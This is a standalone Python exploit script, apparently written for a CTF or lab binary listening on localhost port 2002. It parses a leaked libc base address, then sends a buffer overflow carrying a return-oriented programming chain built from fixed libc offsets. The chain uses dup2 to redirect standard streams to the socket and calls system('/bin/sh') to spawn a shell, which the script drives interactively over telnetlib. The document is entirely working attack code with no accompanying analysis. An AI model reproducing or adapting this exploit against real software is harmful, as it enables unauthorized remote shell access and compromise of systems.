#!/usr/bin/python3

import socket
import telnetlib
import re

s = socket.create_connection(('localhost', 2002))
data = s.recv(2048).decode('ASCII')

pattern = re.compile(r'My libc is loaded at (0x[0-9a-f]+).')
match = pattern.search(data)
libc = match.group(1) if match else None

print(data)
print('Address of libc = ' + libc)


libc_base = int(libc, 16)
pop_rdi = (libc_base + 0x2a3e5).to_bytes(8, 'little')
pop_rsi = (libc_base + 0x2be51).to_bytes(8, 'little')
dup2 = (libc_base + 0x115200).to_bytes(8, 'little')
system = (libc_base + 0x050d70).to_bytes(8, 'little')
bin_sh = (libc_base + 0x1d8698 ).to_bytes(8, 'little')


stdin = 0x0.to_bytes(8, 'little')
stdout = 0x1.to_bytes(8, 'little')
stderr = 0x2.to_bytes(8, 'little')
file_descriptor = 0x4.to_bytes(8, 'little')



rop_chain = b'A' * 0x28
rop_chain += pop_rsi
rop_chain += stdin
rop_chain += pop_rdi
rop_chain += file_descriptor
rop_chain += dup2

rop_chain += pop_rsi
rop_chain += stdout
rop_chain += pop_rdi
rop_chain += file_descriptor
rop_chain += dup2

rop_chain += pop_rsi
rop_chain += stderr
rop_chain += pop_rdi
rop_chain += file_descriptor
rop_chain += dup2

rop_chain += pop_rdi
rop_chain += bin_sh
rop_chain += system

rop_chain += b'\n'

s.send(rop_chain)



t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
